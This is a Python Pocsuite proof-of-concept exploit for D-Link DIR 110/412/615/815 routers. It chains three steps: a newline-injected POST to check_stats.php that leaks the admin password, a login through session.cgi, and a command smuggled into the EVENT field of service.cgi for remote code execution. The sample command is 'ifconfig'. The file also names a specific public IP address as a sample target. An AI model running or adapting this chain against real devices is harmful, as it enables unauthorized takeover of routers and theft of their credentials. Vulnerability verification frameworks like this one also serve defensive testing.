#!/usr/bin/env python
# coding: utf-8

import urllib
import urllib2
import httplib
import random
import string
from collections import OrderedDict
from pocsuite.api.request import req #用法和 requests 完全相同
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
class TestPOC(POCBase):
    vulID = 'SSV-97081' # vul ID
    version = '1.0'
    author = 'fenix'
    vulDate = '2018/01/12'
    createDate = '2018/01/16'
    updateDate = ''
    references = ['https://www.seebug.org/vuldb/ssvid-97081']
    name = 'D-Link Routers 110/412/615/815 Arbitrary Code Execution'
    appPowerLink = 'http://us.dlink.com/'
    appName = 'DLINK-DIR multi Routers'
    appVersion = 'firmware version prior to 1.03'
    vulType = 'RCE'
    desc = '''
    D-Link routers 110/412/615/815 versions prior to 1.03 suffer from a service.cgi arbitrary code execution vulnerability.
    '''
    samples = ['http://78.31.92.160:8080']

    def _verify(self):
        output = Output(self)
        result = {}
        return self._attack()

    def _attack(self, attack=True):
        result = {}
        if not self.url.endswith('/'):
            self.url = self.url + '/'
        # use d-link information disclosure 0day to leak password 
        leak_password_url = '{}check_stats.php'.format(self.url)
        leak_password_payload = 'A=A%0a_POST_CHECK_NODE=/device/account/entry/password%0aAUTHORIZED_GROUP=1'
        headers = {'Cookie': 'uid=' + ''.join(random.choice(string.letters) for _ in range(10)), 'Host': 'localhost', 'CONTENT-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
        password = 'admin'
        res1 = req.post(leak_password_url, data=leak_password_payload, headers=headers).text 

        if '<code>' in res1:
            password = res1[res1.find('<code>')+6:res1.find('</code>')] 
            
        # create session
        s = req.Session() 
        post_content = {'REPORT_METHOD': 'xml', 'ACTION': 'login_plaintext', 'USER': 'admin', 'PASSWD': password, 'CAPTCHA': ''}
        res1 = s.post('{}session.cgi'.format(self.url), data=post_content, headers=headers)

        # rce
        payload = {'password': password, 'command': 'ifconfig'}
        rce_content = 'EVENT=CHECKFW%26ifconfig%26'
        method = 'POST'
        if self.url.lower().startswith('https'):
            handler = urllib2.HTTPSHandler()
        else:
            handler = urllib2.HTTPHandler()
        opener = urllib2.build_opener(handler)
        req2 = urllib2.Request('{}service.cgi'.format(self.url), data=rce_content, headers=headers)
        req2.get_method = lambda: method
        connection = opener.open(req2)
        attempts = 0
        while attempts < 5:
            try:
                data = connection.read()
            except httplib.IncompleteRead:
                attempts += 1
            else:
                break
        if 'inet addr' in data:
            result['AttackInfo'] = {}
            result['AttackInfo']['URL'] = self.url
            result['AttackInfo']['Payload'] = urllib.urlencode(payload) 
            result['Content'] = data
        return self.parse_attack(result)

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

register(TestPOC)
